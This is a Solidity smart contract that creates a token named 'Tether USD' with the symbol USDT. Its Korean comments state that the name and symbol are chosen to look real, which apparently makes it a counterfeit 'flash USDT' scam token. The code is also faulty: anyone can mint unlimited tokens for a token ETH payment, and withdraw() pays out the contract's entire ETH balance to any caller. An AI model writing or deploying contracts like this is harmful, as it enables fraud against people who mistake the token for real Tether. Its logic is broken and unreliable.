// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FlashUSDT {
    string public name = "Tether USD";     // 진짜처럼 이름 표시
    string public symbol = "USDT";         // 심볼도 진짜처럼
    uint8 public decimals = 6;             // USDT와 동일
    uint256 public totalSupply = 25000000 * 10 ** uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public depositTime;

    uint256 public constant DEPOSIT_PERIOD = 10 days;
    address public owner;

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        depositTime[msg.sender] = block.timestamp;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(recipient != address(0), "Transfer to the zero address");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");

        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }

    function mint(uint256 amount) public payable {
        require(msg.value > 0, "Must send ETH to mint");

        uint256 tokens = amount * 10 ** uint256(decimals);
        balanceOf[msg.sender] += tokens;
        totalSupply += tokens;
        depositTime[msg.sender] = block.timestamp;
    }

    function withdraw() public {
        require(block.timestamp >= depositTime[msg.sender] + DEPOSIT_PERIOD, "Deposit period has not ended");

        uint256 amount = balanceOf[msg.sender];
        require(amount > 0, "No balance to withdraw");

        balanceOf[msg.sender] = 0;
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}